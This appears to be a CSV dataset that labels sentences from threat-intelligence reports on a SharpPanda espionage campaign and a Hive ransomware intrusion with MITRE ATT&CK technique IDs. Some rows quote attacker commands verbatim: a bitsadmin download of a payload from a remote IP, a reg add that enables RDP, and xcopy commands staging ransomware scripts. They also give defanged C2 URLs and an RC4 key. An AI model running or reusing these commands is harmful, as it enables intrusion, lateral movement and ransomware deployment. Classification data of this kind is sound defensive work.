text,label
"In its latest campaign, the SharpPanda APT group employs a forged document linked to G7 to target various governments within the G20 forum.",T1566.001
The infection process initiates through a spam email comprising an attached MS Office document named “[FINAL] Hiroshima Action Statement for Resilient Global Food Security_trackchanged.docx.”,T1566.001
"The emails contain weaponized versions of seemingly genuine official documents, which employ the remote template injection method to retrieve the next stage of the malware from the TA’s Command-and-Control (C&C) server.",T1055
"Figure 3 – Opened document attachment from spam email Upon opening the document, it initiates the download of a new payload from the attacker’s remote server (hxxp[:]//13[.]236[.]189[.]80:8000/res/translate[.]res), which is RTF file serving as the next-level payload.",T1105
This tool enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Word’s Equation Editor.,"T1027, T1072"
"RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017-11882, within the Equation Editor of Microsoft Office.",T1072
The RTF file includes both an encrypted payload and shellcode.,T1027
"Once the RTF file is executed, it proceeds to decrypt and drops an embedded payload, which is a DLL file saved under the name “c6gt.b” in the %temp% directory.","T1027, T1140"
"It achieves this by creating a scheduled task entry, which executes the export function “StartA” from the DLL “c6gt.b” using rundll32.exe on a daily basis.","T1106, T1218.011, T1053.005"
"Figure 5 – Embedded payload in RTF file Once the persistence is established, the RTF file proceeds to execute the downloaded DLL payload by utilizing the “rundll32.exe” command as follows:",T1218.011
"Figure 6 – Export functions of the DLL loader When the loader is executed through rundll32.exe, it collects various data from the victim’s computer.",T1218.011
"This includes the hostname, operating system name, OS version, username, Internet information, as well as the presence of any installed anti-virus software on the machine.","T1016, T1518.001, T1082"
"Subsequently, the loader encrypts the collected information using RC4 encryption with the key “xkYgv127” and encodes it using base64.",T1027
"The encrypted data is then exfiltrated using the below C&C URL: hxxps://13[.]236[.]189[.]80:8001/G0AnyWhere_up[.]jsp?Data=[redacted] The figure below illustrates the exfiltrated data sent to the C&C server, as well as the decrypted/decoded stolen information obtained from the victim’s machine.","T1041, T1573.001"
"If they deem the victim’s machine to be intriguing, the C&C server responds with the next stage executable.",T1573.001
"During the final phase of the infection chain, the malicious loader in the SharpPanda APT campaign is specifically designed to download a backdoor module.",T1105
"In previous SharpPanda APT campaigns, the loader establishes a connection with a C&C server in the final stage of the attack.",T1573.001
"Subsequently, it downloads and executes a malicious backdoor.",T1105
"With its extensive capabilities, this backdoor possesses the ability to perform a variety of operations, including: Capture screenshots of victims’ system Obtain information about processes and services running on the machine Create or terminate processes Delete/Create/Rename/Read/Write files and retrieve file attributes Retrieve TCP/UDP tables Retrieve information about registry keys Obtain titles of all top-level windows Trigger a shutdown of the targeted computer Gather computer-specific information such as computer name, username, gateway address, network adapter details, Windows version, and user type Conclusion The SharpPanda APT group is comprised of exceptionally sophisticated cyber-TAs who execute targeted and extended attacks against specific targets, including governments, organizations, and industries, with the objectives of spying, disruption, or monetary gain.","T1057, T1082, T1113, T1012, T1016"
"In addition to those techniques, the actor employed a number of previously unseen techniques designed to to drop the defenses of the victim, inhibit monitoring, disable networking and allow time for the ransomware to finish encrypting files.",T1562.001
"What approach did the malicious actor take to prepare the victim's environment?Initially using Cobalt Strike, the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service (BITSAdmin).""C:\Windows\system32\bitsadmin.exe"" /transfer",T1105
/priority normal http://79.137.206.47/int.exe C:\Windows\int.exe The malicious actor then began using the remote process execution tool PSExec to execute batch files (rdp.bat) that would cause registry changes to enable Remote Desktop sessions (RDP) using reg.exe.,"T1059.003, T1021.001, T1112"
"This enabled the malicious actor to laterally move throughout the victim’s environment using the graphical user interface.PSEXESVC.exe: C:\Windows\PSEXESVC.exe└──cmd.exe: C:\Windows\system32\cmd.exe /c """"rdp.bat"" ""└── reg.exe: reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v","T1059.003, T1112"
"""fDenyTSConnections"" /t",T1112
REG_DWORD /d 0,T1112
"/f Rapid7 observed the malicious actor add/change policies for the Active Directory domain to perform the following:Copy down batch scriptsExecute batch scripts (file1.bat), which:Creates administrator account on the local systemReconfigures boot configuration data (bcdedit.exe) so that the host will not load any additional drivers or services (ie: network drivers or endpoint protection)Sets various registry values to ensure the created local administrator user will automatically logon by defaultChanges the Windows Shell from Explorer to their malicious script (file2.bat)Reboots the system with the shutdown commandOn reboot, the system logs in and executes the shell (file2.bat), which:Extracts HIVE ransomware payload(s) from an encrypted archive (int.7z) using 7-Zip's console executable (7zr.exe)Executes the ransomware payload (int.exe or int64.exe)Below are some commands observed executed by the malicious actor (with necessary redactions):xcopy.exe /C/Q/H/Y/Z ""\\<REDACTED>\sysvol\<REDACTED>\Policies {<REDACTED>}\Machine\Scripts\Startup\file1.bat"" ""C:\windows"" xcopy.exe /C/Q/H/Y/Z ""\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\file2.bat"" ""C:\windows"" xcopy.exe /C/Q/H/Y/Z ""\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\7zr.exe"" ""C:\windows"" xcopy.exe /C/Q/H/Y/Z ""\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\int.7z"" ""C:\windows\"" C:\WINDOWS\SYSTEM32\cmd.exe /c","T1059.003, T1112"
